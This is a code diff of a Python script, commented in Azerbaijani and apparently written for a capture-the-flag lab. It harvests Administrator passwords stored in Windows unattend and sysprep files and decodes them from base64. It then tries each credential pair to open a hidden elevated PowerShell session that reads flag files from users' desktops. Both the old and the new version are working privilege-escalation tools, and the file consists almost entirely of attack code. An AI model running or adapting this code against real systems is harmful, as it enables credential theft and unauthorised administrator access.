@@ -1,94 +1,183 @@
-#bu skript, Windows sistemlərində avtomatlaşdırılmış quraşdırma fayllarını (Unattended Installation files) axtaran və orada saxlanılan Administrator parollarını aşkar edib istifadə etməyə çalışan bir avtomatlaşdırma alətidir
+#!/usr/bin/env python3
 import os
 import re
 import base64
 import subprocess
+import tempfile
+import sys
 
-# Common paths for unattend and sysprep files on Windows
-PATHS = [
+UNATTEND_CANDIDATE_PATHS = [
     r"C:\unattend.xml",
-    r"C:\unattend.txt",
-    r"C:\sysprep.inf",
-    r"C:\sysprep.xml",
     r"C:\Windows\Panther\Unattend.xml",
+    r"C:\Windows\Panther\Unattended.xml",
     r"C:\Windows\Panther\Unattend\Unattend.xml",
-    r"C:\Windows\System32\Sysprep\unattend.xml",
-    r"C:\Windows\System32\Sysprep\sysprep.xml"
+    r"C:\Windows\Panther\Unattend\Unattended.xml",
+    r"C:\Windows\System32\Sysprep\sysprep.xml",
+    r"C:\Windows\System32\Sysprep\Panther\Unattend.xml",
+    r"C:\Windows\System32\sysprep.inf",
 ]
 
-# Regex patterns to extract encoded values
-ADMIN_PATTERN = re.compile(r'<AdministratorPassword>(?:.|\n)*?<Value>(.*?)</Value>', re.IGNORECASE)
-AUTOLOGON_PATTERN = re.compile(r'<AutoLogon>(?:.|\n)*?<Password>(?:.|\n)*?<Value>(.*?)</Value>', re.IGNORECASE)
+ADMIN_BLOCK_RE = re.compile(
+    r"<AdministratorPassword>(.*?)</AdministratorPassword>", re.IGNORECASE | re.DOTALL
+)
+VALUE_RE = re.compile(r"<Value>(.*?)</Value>", re.IGNORECASE | re.DOTALL)
+PLAINTEXT_RE = re.compile(r"<PlainText>(.*?)</PlainText>", re.IGNORECASE | re.DOTALL)
 
-def decode_password(encoded_str, salt):
-    """
-    Decodes Windows Base64 UTF-16LE encoded strings and strips the XML node salt.
-    """
+def find_unattend_files():
+    return [p for p in UNATTEND_CANDIDATE_PATHS if os.path.isfile(p)]
+
+def extract_admin_password_field(filepath):
     try:
-        decoded_bytes = base64.b64decode(encoded_str)
-        decoded_text = decoded_bytes.decode('utf-16-le')
-        
-        # Windows appends the tag name to the end of the plaintext password before encoding
-        if decoded_text.endswith(salt):
-            return decoded_text[:-len(salt)]
-        return decoded_text
+        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
+            content = f.read()
+    except (PermissionError, FileNotFoundError) as e:
+        print(f"[!] {filepath} oxuna bilmedi: {e}")
+        return None, None
+    
+    block_match = ADMIN_BLOCK_RE.search(content)
+    if not block_match:
+        return None, None
+    
+    block = block_match.group(1)
+    value_match = VALUE_RE.search(block)
+    plaintext_match = PLAINTEXT_RE.search(block)
+    
+    value = value_match.group(1).strip() if value_match else None
+    is_plaintext = (
+        plaintext_match is not None
+        and plaintext_match.group(1).strip().lower() == "true"
+    )
+    return value, is_plaintext
+
+def decode_unattend_password(value, is_plaintext, suffix="AdministratorPassword"):
+    if value is None:
+        return []
+    
+    candidates = []
+    
+    if is_plaintext:
+        candidates.append(value)
+    
+    # UTF-16LE + suffix
+    try:
+        raw = base64.b64decode(value)
+        utf16_decoded = raw.decode("utf-16-le", errors="ignore")
+        if utf16_decoded.endswith(suffix):
+            candidates.append(utf16_decoded[: -len(suffix)])
+        candidates.append(utf16_decoded)
+    except Exception:
+        pass
+    
+    # Sadə base64
+    try:
+        raw = base64.b64decode(value)
+        ascii_decoded = raw.decode("utf-8", errors="ignore")
+        candidates.append(ascii_decoded)
+    except Exception:
+        pass
+    
+    def is_clean(s):
+        return bool(s) and s.isprintable() and "\x00" not in s
+    
+    clean = [c for c in candidates if is_clean(c)]
+    seen = set()
+    ordered_clean = [c for c in clean if not (c in seen or seen.add(c))]
+    return ordered_clean if ordered_clean else candidates
+
+def find_builtin_admin_username():
+    try:
+        result = subprocess.run(
+            [
+                "powershell", "-NoProfile", "-Command",
+                "(Get-LocalUser | Where-Object { $_.SID -like '*-500' }).Name",
+            ],
+            capture_output=True, text=True, timeout=15,
+        )
+        name = result.stdout.strip()
+        return name if name else None
     except Exception as e:
-        print(f"[-] Error decoding: {e}")
+        print(f"[!] Yerli admin hesabi avtomatik askar edile bilmedi: {e}")
         return None
 
-def scan_files():
-    found_password = None
-    print("[*] Scanning common locations for unattended configuration files...")
+def spawn_admin_session_and_read_flag(username, password):
+    tmp_out = os.path.join(tempfile.gettempdir(), "unattend_flag_out.txt")
+    if os.path.exists(tmp_out):
+        os.remove(tmp_out)
     
-    for path in PATHS:
-        if os.path.exists(path):
-            print(f"[+] Found file: {path}")
-            try:
-                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
-                    content = f.read()
-                
-                # Check for AdministratorPassword block
-                admin_match = ADMIN_PATTERN.search(content)
-                if admin_match:
-                    encoded = admin_match.group(1)
-                    print(f"    [->] Found AdministratorPassword block (Encoded: {encoded})")
-                    decoded = decode_password(encoded, "AdministratorPassword")
-                    if decoded:
-                        print(f"    [!] Decoded Admin Password: {decoded}")
-                        found_password = decoded
-
-                # Check for AutoLogon block
-                autologon_match = AUTOLOGON_PATTERN.search(content)
-                if autologon_match:
-                    encoded = autologon_match.group(1)
-                    print(f"    [->] Found AutoLogon Password block (Encoded: {encoded})")
-                    decoded = decode_password(encoded, "Password")
-                    if decoded:
-                        print(f"    [!] Decoded AutoLogon Password: {decoded}")
-                        found_password = decoded
-                        
-            except Exception as e:
-                print(f"[-] Failed to read {path}: {e}")
-                
-    return found_password
-
-def launch_admin_session(password):
-    if not password:
-        print("\n[-] No passwords were recovered. Cannot launch admin session.")
-        return
-
-    print(f"\n[+] Recovered Password: {password}")
-    print("[*] Launching administrative session via runas...")
-    print("[!] NOTE: You will need to type/paste the password when prompted below.")
+    inner_cmd = (
+        "$flagFiles = Get-ChildItem -Path 'C:\\Users\\*\\Desktop' "
+        "-Filter '*flag*' -ErrorAction SilentlyContinue; "
+        "foreach ($f in $flagFiles) { Get-Content $f.FullName } "
+        f"| Out-File -FilePath '{tmp_out}' -Encoding utf8"
+    )
     
-    # Runas command to pull the flag from the Administrator's desktop
-    cmd = 'runas /user:Administrator "cmd.exe /k type C:\\Users\\Administrator\\Desktop\\flag.txt"'
+    ps_launcher = (
+        f'$secPass = ConvertTo-SecureString "{password}" -AsPlainText -Force; '
+        f'$cred = New-Object System.Management.Automation.PSCredential("{username}", $secPass); '
+        f'try {{ Start-Process powershell.exe -Credential $cred -WindowStyle Hidden '
+        f'-ArgumentList "-NoProfile","-Command","{inner_cmd}" -Wait -ErrorAction Stop }} '
+        f'catch {{ Write-Output "ELEVATION_FAILED" }}'
+    )
     
-    try:
-        subprocess.run(cmd, shell=True)
-    except KeyboardInterrupt:
-        print("\n[-] Session launch cancelled.")
+    result = subprocess.run(
+        ["powershell", "-NoProfile", "-Command", ps_launcher],
+        capture_output=True, text=True,
+    )
+    
+    if "ELEVATION_FAILED" in result.stdout or "ELEVATION_FAILED" in (result.stderr or ""):
+        print(f"    [-] {username} / {password!r} -> credential-lar redd edildi.")
+        return False
+    
+    if os.path.exists(tmp_out):
+        with open(tmp_out, "r", encoding="utf-8", errors="ignore") as f:
+            flag_content = f.read().strip()
+        if flag_content:
+            print(f"\n[+] UGUR!  Username: {username}   Password: {password}")
+            print(f"[+] FLAG:\n{flag_content}\n")
+            return True
+    
+    print(f"    [-] {username} / {password!r} -> elevated sessiya acildi, amma flag tapilmadi.")
+    return False
+
+def main():
+    print("[*] Unattended installation faylları axtarılır...\n")
+    files = find_unattend_files()
+    
+    if not files:
+        print("[-] Standart yollarda hec bir unattend/sysprep fayli tapilmadi.")
+        sys.exit(1)
+    
+    for filepath in files:
+        print(f"[+] Tapildi: {filepath}")
+        value, is_plaintext = extract_admin_password_field(filepath)
+        
+        if value is None:
+            print("    [-] Bu faylda <AdministratorPassword> sahesi tapilmadi.\n")
+            continue
+        
+        password_candidates = decode_unattend_password(value, is_plaintext)
+        if not password_candidates:
+            print("    [-] Sifre desifre edile bilmedi.\n")
+            continue
+        
+        print(f"    [+] Mumkun sifre namizedleri: {password_candidates}")
+        
+        detected_user = find_builtin_admin_username()
+        username_candidates = []
+        for u in [detected_user, "SuperAdministrator", "Administrator"]:
+            if u and u not in username_candidates:
+                username_candidates.append(u)
+        
+        print(f"    [+] Yoxlanacaq istifadeci adlari: {username_candidates}\n")
+        
+        for username in username_candidates:
+            for password in password_candidates:
+                print(f"[*] Cehd olunur: {username} / {password}")
+                if spawn_admin_session_and_read_flag(username, password):
+                    return
+        print()
+    
+    print("[-] Hec bir (username, password) kombinasiyasi ile elevated sessiya acila bilmedi.")
 
 if __name__ == "__main__":
-    pwd = scan_files()
-    launch_admin_session(pwd)
+    main()
